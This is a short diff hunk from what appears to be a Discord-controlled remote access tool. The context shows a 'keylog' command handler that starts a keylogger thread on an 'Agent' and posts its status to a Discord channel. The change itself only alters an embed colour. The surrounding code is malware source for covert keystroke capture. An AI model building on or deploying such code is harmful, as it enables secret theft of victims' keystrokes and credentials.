@@ -286,7 +286,7 @@ async def keylog(context):
             threading.Thread(target=keylogger_start).start()
             try:
                 if word_list[1] == "stop":
-                    my_embed = discord.Embed(title=f"Keylogger stopped on Agent#{ID}", color=0xFF0000)
+                    my_embed = discord.Embed(title=f"Keylogger stopped on Agent#{ID}", color=0x00FF00)
                     await context.message.channel.send(embed=my_embed)
                     return
             except Exception as e:
